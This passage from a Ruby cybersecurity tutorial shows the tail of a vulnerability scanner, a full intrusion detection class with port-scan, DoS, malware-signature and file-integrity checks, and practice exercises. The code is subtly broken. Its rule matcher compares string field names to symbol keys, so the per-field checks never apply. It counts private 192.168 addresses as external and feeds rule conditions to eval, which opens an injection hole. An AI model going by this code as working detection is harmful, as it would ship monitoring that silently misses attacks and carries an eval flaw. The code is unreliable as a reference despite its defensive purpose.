    elsif medium_vulns > 0
      'medium'
    else
      'low'
    end
  end
  
  def generate_recommendations
    recommendations = []
    
    @network_map[:vulnerabilities].each do |vuln|
      case vuln[:type]
      when 'sql_injection'
        recommendations << {
          priority: 'high',
          description: 'Implement input validation and parameterized queries to prevent SQL injection'
        }
      when 'xss'
        recommendations << {
          priority: 'high',
          description: 'Implement output encoding and Content Security Policy to prevent XSS'
        }
      when 'directory_traversal'
        recommendations << {
          priority: 'high',
          description: 'Validate and sanitize file paths to prevent directory traversal'
        }
      when 'missing_security_header'
        recommendations << {
          priority: 'medium',
          description: 'Add missing security headers to improve web application security'
        }
      end
    end
    
    recommendations.uniq
  end
end
```

### Intrusion Detection System

```ruby
class IntrusionDetectionSystem
  def initialize
    @rules = load_detection_rules
    @alerts = []
    @network_traffic = []
    @system_logs = []
    @baseline = establish_baseline
  end
  
  def start_monitoring
    # Start network traffic monitoring
    Thread.new { monitor_network_traffic }
    
    # Start system log monitoring
    Thread.new { monitor_system_logs }
    
    # Start process monitoring
    Thread.new { monitor_processes }
    
    # Start file integrity monitoring
    Thread.new { monitor_file_integrity }
    
    puts "Intrusion Detection System started"
  end
  
  def add_custom_rule(rule)
    @rules << rule
    puts "Custom rule added: #{rule[:name]}"
  end
  
  def analyze_network_packet(packet)
    threats = []
    
    @rules.each do |rule|
      if rule_matches_packet?(rule, packet)
        threats << {
          rule: rule[:name],
          severity: rule[:severity],
          packet: packet,
          timestamp: Time.now
        }
      end
    end
    
    threats.each do |threat|
      create_alert(threat)
    end
    
    threats
  end
  
  def analyze_system_log(log_entry)
    anomalies = []
    
    # Check for suspicious log patterns
    suspicious_patterns = [
      /failed login/i,
      /authentication failure/i,
      /privilege escalation/i,
      /unauthorized access/i,
      /malware detected/i,
      /intrusion attempt/i
    ]
    
    suspicious_patterns.each do |pattern|
      if log_entry[:message].match?(pattern)
        anomalies << {
          type: 'suspicious_log_pattern',
          pattern: pattern.source,
          severity: 'medium',
          log_entry: log_entry,
          timestamp: Time.now
        }
      end
    end
    
    # Check for baseline deviations
    if baseline_deviation?(log_entry)
      anomalies << {
        type: 'baseline_deviation',
        severity: 'low',
        log_entry: log_entry,
        timestamp: Time.now
      }
    end
    
    anomalies.each do |anomaly|
      create_alert(anomaly)
    end
    
    anomalies
  end
  
  def detect_port_scan(traffic_data)
    port_scan_indicators = []
    
    # Group traffic by source IP
    traffic_by_source = traffic_data.group_by { |packet| packet[:source_ip] }
    
    traffic_by_source.each do |source_ip, packets|
      # Check for port scan patterns
      unique_ports = packets.map { |p| p[:dest_port] }.uniq
      connection_attempts = packets.length
      
      # Port scan detection criteria
      if unique_ports.length > 50 && connection_attempts < 200
        port_scan_indicators << {
          type: 'port_scan',
          source_ip: source_ip,
          scanned_ports: unique_ports,
          connection_attempts: connection_attempts,
          severity: 'high',
          timestamp: Time.now
        }
      elsif unique_ports.length > 20 && connection_attempts < 100
        port_scan_indicators << {
          type: 'possible_port_scan',
          source_ip: source_ip,
          scanned_ports: unique_ports,
          connection_attempts: connection_attempts,
          severity: 'medium',
          timestamp: Time.now
        }
      end
    end
    
    port_scan_indicators.each do |indicator|
      create_alert(indicator)
    end
    
    port_scan_indicators
  end
  
  def detect_dos_attack(traffic_data)
    dos_indicators = []
    
    # Group traffic by destination
    traffic_by_dest = traffic_data.group_by { |packet| packet[:dest_ip] }
    
    traffic_by_dest.each do |dest_ip, packets|
      # Check for DoS patterns
      requests_per_second = packets.length / 60.0  # Assuming 1 minute window
      unique_sources = packets.map { |p| p[:source_ip] }.uniq.length
      
      # DoS detection criteria
      if requests_per_second > 1000
        dos_indicators << {
          type: 'dos_attack',
          target_ip: dest_ip,
          requests_per_second: requests_per_second,
          unique_sources: unique_sources,
          severity: 'critical',
          timestamp: Time.now
        }
      elsif requests_per_second > 500
        dos_indicators << {
          type: 'possible_dos_attack',
          target_ip: dest_ip,
          requests_per_second: requests_per_second,
          unique_sources: unique_sources,
          severity: 'high',
          timestamp: Time.now
        }
      end
    end
    
    dos_indicators.each do |indicator|
      create_alert(indicator)
    end
    
    dos_indicators
  end
  
  def detect_malware(behavior_data)
    malware_indicators = []
    
    # Check for suspicious behavior patterns
    suspicious_behaviors = [
      :unusual_network_connections,
      :file_encryption_activity,
      :privilege_escalation_attempts,
      :unusual_process_creation,
      :registry_modification,
      :persistence_mechanisms
    ]
    
    suspicious_behaviors.each do |behavior|
      if behavior_data.include?(behavior)
        malware_indicators << {
          type: 'malware_behavior',
          behavior: behavior,
          severity: 'high',
          timestamp: Time.now
        }
      end
    end
    
    # Check for known malware signatures
    malware_signatures = load_malware_signatures
    behavior_data[:file_hashes].each do |file_hash|
      if malware_signatures.include?(file_hash)
        malware_indicators << {
          type: 'known_malware',
          file_hash: file_hash,
          severity: 'critical',
          timestamp: Time.now
        }
      end
    end
    
    malware_indicators.each do |indicator|
      create_alert(indicator)
    end
    
    malware_indicators
  end
  
  def get_alerts(severity_filter = nil, time_filter = nil)
    filtered_alerts = @alerts.dup
    
    # Filter by severity
    if severity_filter
      filtered_alerts = filtered_alerts.select { |alert| alert[:severity] == severity_filter }
    end
    
    # Filter by time
    if time_filter
      filtered_alerts = filtered_alerts.select do |alert|
        alert[:timestamp] >= time_filter
      end
    end
    
    filtered_alerts.sort_by { |alert| -alert[:timestamp].to_f }
  end
  
  def get_statistics
    {
      total_alerts: @alerts.length,
      alerts_by_severity: @alerts.group_by { |a| a[:severity] }.transform_values(&:count),
      alerts_by_type: @alerts.group_by { |a| a[:type] }.transform_values(&:count),
      recent_alerts: @alerts.select { |a| a[:timestamp] > Time.now - 3600 }.length,
      baseline_deviations: @alerts.count { |a| a[:type] == 'baseline_deviation' }
    }
  end
  
  def generate_report(time_range = 3600)
    start_time = Time.now - time_range
    relevant_alerts = @alerts.select { |alert| alert[:timestamp] >= start_time }
    
    report = {
      period: {
        start: start_time,
        end: Time.now,
        duration: time_range
      },
      summary: {
        total_alerts: relevant_alerts.length,
        critical_alerts: relevant_alerts.count { |a| a[:severity] == 'critical' },
        high_alerts: relevant_alerts.count { |a| a[:severity] == 'high' },
        medium_alerts: relevant_alerts.count { |a| a[:severity] == 'medium' },
        low_alerts: relevant_alerts.count { |a| a[:severity] == 'low' }
      },
      top_threats: relevant_alerts.group_by { |a| a[:type] }
        .transform_values(&:count)
        .sort_by { |_, count| -count }
        .first(10),
      timeline: relevant_alerts.map { |a| { time: a[:timestamp], type: a[:type], severity: a[:severity] } },
      recommendations: generate_security_recommendations(relevant_alerts)
    }
    
    report
  end
  
  private
  
  def load_detection_rules
    # Load detection rules (simplified)
    [
      {
        name: 'Suspicious Port Connection',
        severity: 'medium',
        conditions: {
          dest_port: [22, 23, 80, 443, 3389],
          source_ip: 'external',
          connection_count: '> 10'
        }
      },
      {
        name: 'Large Data Transfer',
        severity: 'low',
        conditions: {
          packet_size: '> 1000000',
          direction: 'outbound'
        }
      },
      {
        name: 'Unauthorized Admin Access',
        severity: 'high',
        conditions: {
          dest_port: 22,
          username: 'admin',
          authentication: 'success'
        }
      },
      {
        name: 'DNS Tunneling',
        severity: 'medium',
        conditions: {
          protocol: 'dns',
          query_length: '> 100',
          frequency: '> 50/min'
        }
      }
    ]
  end
  
  def establish_baseline
    # Establish normal network baseline
    {
      normal_traffic_volume: 1000,  # packets per minute
      normal_connection_count: 50,   # connections per minute
      normal_packet_size: 1500,      # average packet size
      normal_ports: [80, 443, 22, 25, 53],
      normal_protocols: ['tcp', 'udp', 'icmp']
    }
  end
  
  def monitor_network_traffic
    loop do
      # Simulate network traffic monitoring
      packet = generate_network_packet
      @network_traffic << packet
      
      # Analyze packet
      analyze_network_packet(packet)
      
      # Keep only recent traffic
      @network_traffic = @network_traffic.last(10000)
      
      sleep(0.1)
    end
  end
  
  def monitor_system_logs
    loop do
      # Simulate system log monitoring
      log_entry = generate_system_log
      @system_logs << log_entry
      
      # Analyze log entry
      analyze_system_log(log_entry)
      
      # Keep only recent logs
      @system_logs = @system_logs.last(10000)
      
      sleep(1)
    end
  end
  
  def monitor_processes
    loop do
      # Monitor system processes
      processes = get_system_processes
      
      # Check for suspicious processes
      suspicious_processes = detect_suspicious_processes(processes)
      
      suspicious_processes.each do |process|
        create_alert({
          type: 'suspicious_process',
          process: process,
          severity: 'medium',
          timestamp: Time.now
        })
      end
      
      sleep(5)
    end
  end
  
  def monitor_file_integrity
    # Monitor critical files for changes
    critical_files = [
      '/etc/passwd',
      '/etc/shadow',
      '/etc/hosts',
      '/var/log/auth.log'
    ]
    
    file_hashes = {}
    
    critical_files.each do |file|
      if File.exist?(file)
        file_hashes[file] = calculate_file_hash(file)
      end
    end
    
    loop do
      critical_files.each do |file|
        if File.exist?(file)
          current_hash = calculate_file_hash(file)
          
          if file_hashes[file] && file_hashes[file] != current_hash
            create_alert({
              type: 'file_integrity_violation',
              file: file,
              previous_hash: file_hashes[file],
              current_hash: current_hash,
              severity: 'high',
              timestamp: Time.now
            })
            
            file_hashes[file] = current_hash
          end
        end
      end
      
      sleep(30)
    end
  end
  
  def generate_network_packet
    {
      source_ip: "192.168.1.#{rand(254) + 1}",
      dest_ip: "10.0.0.#{rand(254) + 1}",
      source_port: rand(65535),
      dest_port: [22, 80, 443, 3389, 25, 53].sample,
      protocol: ['tcp', 'udp', 'icmp'].sample,
      packet_size: rand(1500),
      timestamp: Time.now
    }
  end
  
  def generate_system_log
    log_types = [
      { type: 'auth', message: 'Successful login for user john' },
      { type: 'auth', message: 'Failed login attempt from 192.168.1.100' },
      { type: 'system', message: 'System update completed' },
      { type: 'network', message: 'Connection established to 10.0.0.1' },
      { type: 'error', message: 'Disk space low' }
    ]
    
    log_entry = log_types.sample
    log_entry[:timestamp] = Time.now
    log_entry
  end
  
  def get_system_processes
    # Get system processes (simplified)
    [
      { name: 'chrome', pid: 1234, cpu: 15.5, memory: 500000 },
      { name: 'firefox', pid: 5678, cpu: 8.2, memory: 300000 },
      { name: 'sshd', pid: 22, cpu: 0.1, memory: 5000 },
      { name: 'httpd', pid: 80, cpu: 2.3, memory: 100000 }
    ]
  end
  
  def detect_suspicious_processes(processes)
    suspicious = []
    
    processes.each do |process|
      # Check for high CPU usage
      if process[:cpu] > 80
        suspicious << {
          reason: 'high_cpu_usage',
          process: process
        }
      end
      
      # Check for high memory usage
      if process[:memory] > 1000000
        suspicious << {
          reason: 'high_memory_usage',
          process: process
        }
      end
      
      # Check for suspicious process names
      suspicious_names = ['malware', 'virus', 'trojan', 'backdoor']
      if suspicious_names.any? { |name| process[:name].include?(name) }
        suspicious << {
          reason: 'suspicious_name',
          process: process
        }
      end
    end
    
    suspicious
  end
  
  def calculate_file_hash(file_path)
    # Calculate file hash
    content = File.read(file_path)
    Digest::SHA256.hexdigest(content)
  end
  
  def rule_matches_packet?(rule, packet)
    conditions = rule[:conditions]
    
    conditions.each do |field, condition|
      case field
      when 'dest_port'
        return false unless condition.include?(packet[:dest_port])
      when 'source_ip'
        return false unless condition == 'external' && packet[:source_ip].start_with?('192.168.')
      when 'packet_size'
        return false unless eval("#{packet[:packet_size]} #{condition}")
      end
    end
    
    true
  end
  
  def baseline_deviation?(log_entry)
    # Check if log entry deviates from baseline
    case log_entry[:type]
    when 'auth'
      # Check for unusual login patterns
      @baseline[:normal_connection_count] < 10
    when 'network'
      # Check for unusual network activity
      false  # Simplified
    else
      false
    end
  end
  
  def load_malware_signatures
    # Load known malware signatures (simplified)
    [
      'a1b2c3d4e5f6789012345678901234567890abcd',
      'f1e2d3c4b5a6978012345678901234567890abcd',
      '9f8e7d6c5b4a3210fedcba0987654321abcdef0'
    ]
  end
  
  def create_alert(alert_data)
    alert = {
      id: SecureRandom.uuid,
      timestamp: alert_data[:timestamp] || Time.now,
      type: alert_data[:type],
      severity: alert_data[:severity],
      description: generate_alert_description(alert_data),
      details: alert_data,
      status: 'new'
    }
    
    @alerts << alert
    
    # Keep only recent alerts
    @alerts = @alerts.last(10000)
    
    # Trigger immediate response for critical alerts
    if alert[:severity] == 'critical'
      trigger_immediate_response(alert)
    end
    
    alert
  end
  
  def generate_alert_description(alert_data)
    case alert_data[:type]
    when 'port_scan'
      "Port scan detected from #{alert_data[:source_ip]} targeting #{alert_data[:scanned_ports].length} ports"
    when 'dos_attack'
      "DoS attack detected against #{alert_data[:target_ip]} with #{alert_data[:requests_per_second]} requests/second"
    when 'malware_behavior'
      "Malware behavior detected: #{alert_data[:behavior]}"
    when 'file_integrity_violation'
      "File integrity violation detected for #{alert_data[:file]}"
    when 'suspicious_process'
      "Suspicious process detected: #{alert_data[:process][:name]} (PID: #{alert_data[:process][:pid]})"
    else
      "Security alert: #{alert_data[:type]}"
    end
  end
  
  def trigger_immediate_response(alert)
    # Immediate response for critical alerts
    case alert[:type]
    when 'dos_attack'
      block_ip(alert[:details][:target_ip])
    when 'malware_behavior'
      quarantine_system
    when 'port_scan'
      block_ip(alert[:details][:source_ip])
    end
    
    puts "CRITICAL ALERT: #{alert[:description]}"
    puts "Immediate response triggered"
  end
  
  def block_ip(ip_address)
    # Block IP address (simplified)
    puts "Blocking IP address: #{ip_address}"
  end
  
  def quarantine_system
    # Quarantine system (simplified)
    puts "System quarantined due to malware detection"
  end
  
  def generate_security_recommendations(alerts)
    recommendations = []
    
    alert_types = alerts.group_by { |a| a[:type] }
    
    if alert_types['port_scan']
      recommendations << "Implement rate limiting and IP blocking for port scan prevention"
    end
    
    if alert_types['dos_attack']
      recommendations << "Deploy DDoS protection and load balancing"
    end
    
    if alert_types['malware_behavior']
      recommendations << "Update antivirus signatures and implement application whitelisting"
    end
    
    if alert_types['file_integrity_violation']
      recommendations << "Implement file integrity monitoring and access controls"
    end
    
    recommendations
  end
end
```

## Practice Exercises

### Exercise 1: Complete Security Framework
Build a comprehensive security framework with:
- Advanced cryptographic operations
- Secure communication protocols
- Network security scanning
- Vulnerability assessment

### Exercise 2: Security Operations Center
Create a complete SOC monitoring system:
- Real-time threat detection
- Automated incident response
- Security analytics dashboard
- Threat intelligence integration

### Exercise 3: Penetration Testing Tools
Build penetration testing tools:
- Web application scanner
- Network exploitation tools
- Social engineering toolkit
- Post-exploitation framework

### Exercise 4: Security Automation Platform
Create a security automation platform:
- Automated security testing
- Compliance monitoring
- Security orchestration
- Incident management

---

**Ready to become a cybersecurity expert? Let's dive into advanced security development in Ruby! 🔒**
